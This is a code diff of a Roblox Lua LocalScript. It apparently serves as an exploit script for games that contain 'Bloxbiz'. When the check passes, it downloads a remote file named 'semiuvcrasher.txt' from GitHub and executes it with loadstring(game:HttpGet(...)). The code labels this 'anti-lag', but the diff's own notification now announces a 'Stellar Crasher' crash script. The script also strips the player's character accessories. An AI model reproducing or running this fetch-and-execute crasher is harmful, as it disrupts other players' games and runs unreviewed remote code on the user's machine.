@@ -1,7 +1,6 @@
--- LocalScript placed in StarterPlayerScripts or StarterGui
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
 
 -- Function to check if the game contains "Bloxbiz"
 local function checkForBloxbiz()
@@ -15,8 +14,11 @@ end
 
 -- Function to remove all accessories from the local player's character
 local function removeAllAccessories()
-    local player = game.Players.LocalPlayer
+    local player = Players.LocalPlayer
     local character = player.Character or player.CharacterAdded:Wait()
+
+    -- Wait for a brief moment to ensure the accessories are fully loaded
+    wait(1)  -- Add a small delay to ensure the character and accessories are loaded
 
     -- Iterate through all descendants of the character and remove any accessories
     for _, item in pairs(character:GetDescendants()) do
@@ -30,22 +32,36 @@ end
 if checkForBloxbiz() then
     -- Notify the player that the game is supported
     StarterGui:SetCore("SendNotification", {
-        Title = "Executed Anti Lag",
-        Text = "All accessories removed and anti lag executed.",
+        Title = "Game Supported",
+        Text = "This game contains Bloxbiz and is supported.",
         Duration = 5
     })
-
-    -- Remove all accessories from the player's character
-    removeAllAccessories()
 
     -- Execute the loadstring for anti-lag script
     local success, err = pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
     end)
 
-    if not success then
+    if success then
+        -- Notify the player that the anti-lag script was executed
+        StarterGui:SetCore("SendNotification", {
+            Title = "Stellar Crasher Executed",
+            Text = "The crash script has been executed.",
+            Duration = 5
+        })
+    else
         warn("Failed to execute the script: " .. err)
     end
+
+    -- Wait for a short delay before removing accessories after executing the anti-lag script
+    wait(2)  -- Give some time for the anti-lag script to run before removing accessories
+    removeAllAccessories()
+
+    StarterGui:SetCore("SendNotification", {
+        Title = "Accessories Removed",
+        Text = "All accessories have been removed from your character.",
+        Duration = 5
+    })
 else
     -- Notify the player that the game is not supported
     StarterGui:SetCore("SendNotification", {
@@ -56,8 +72,14 @@ else
 end
 
 -- Optional: Remove accessories when the player respawns
-game.Players.LocalPlayer.CharacterAdded:Connect(function()
+Players.LocalPlayer.CharacterAdded:Connect(function()
     if checkForBloxbiz() then
+        wait(1)  -- Wait a moment for the character to load before removing accessories
         removeAllAccessories()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Accessories Removed",
+            Text = "All accessories have been removed from your character.",
+            Duration = 5
+        })
     end
 end)
